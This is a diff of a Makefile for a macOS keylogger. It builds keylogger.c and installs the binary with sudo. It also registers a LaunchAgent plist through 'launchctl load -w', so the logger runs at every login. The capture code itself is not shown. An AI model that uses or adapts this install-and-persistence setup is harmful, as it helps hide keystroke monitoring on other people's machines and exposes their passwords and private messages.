@@ -2,25 +2,25 @@ CC=gcc
 CFLAGS=-framework ApplicationServices -framework Carbon
 SOURCES=keylogger.c
 EXECUTABLE=keylogger
+INSTALLBIN=/usr/local/bin/keylogger
 PLIST=keylogger.plist
-INSTALLDIR=/usr/local/bin
-PLISTDIR=/Library/LaunchDaemons
-PLISTFULL=$(PLISTDIR)/$(PLIST)
+PLISTFULL=/Library/LaunchAgents/keylogger.plist
 
 all: $(SOURCES)
+	./configure
 	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)
 
 install: all
-	mkdir -p $(INSTALLDIR)
-	cp $(EXECUTABLE) $(INSTALLDIR)
+	sudo mkdir -p /usr/local/bin
+	sudo install -m755 $(EXECUTABLE) $(INSTALLBIN)
 
 uninstall:
 	launchctl unload $(PLISTFULL)
-	rm $(INSTALLDIR)/$(EXECUTABLE)
-	rm -f $(PLISTFULL)
+	sudo $(RM) $(INSTALLBIN)
+	$(RM) $(PLISTFULL)
 
 startup: install
-	cp $(PLIST) $(PLISTFULL)
+	sudo cp -f -v $(PLIST) $(PLISTFULL)
 	launchctl load -w $(PLISTFULL)
 
 load:
@@ -30,4 +30,4 @@ unload:
 	launchctl unload $(PLISTFULL)
 
 clean:
-	rm $(EXECUTABLE)
+	$(RM) $(EXECUTABLE)
